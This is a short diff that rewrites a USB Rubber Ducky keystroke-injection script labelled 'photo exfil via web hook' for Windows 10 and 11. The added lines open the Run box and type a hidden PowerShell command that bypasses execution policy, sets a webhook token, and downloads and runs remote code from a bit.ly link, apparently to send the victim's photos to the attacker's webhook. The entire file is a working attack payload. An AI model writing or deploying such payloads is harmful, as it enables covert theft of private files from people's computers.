@@ -1,1 +1,9 @@
-REM ducky script to give webhook url variable and run script (shortened)
+REM photo exfil via web hook
+
+REM Mode: HID
+REM Target: Windows 10, 11
+
+GUI r
+DELAY 250
+STRING powershell -w h -NoP -Ep Bypass $dc='insert webhook access token';irm bit.ly/foto-moto | iex
+ENTER
